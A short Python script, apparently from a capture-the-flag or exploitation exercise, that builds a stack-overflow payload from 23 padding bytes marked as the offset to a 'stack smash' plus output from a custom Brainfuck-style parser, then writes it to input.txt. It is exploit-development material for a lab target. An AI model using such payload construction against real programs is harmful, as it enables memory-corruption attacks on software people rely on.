from bf_parser import *

p = BF_Parser("><")

offset = b"A" * 23 # offset until stack smash ; added for debugging
payload = offset + p.parse()

print(payload)

with open("input.txt", "wb") as fout:
    fout.write(payload)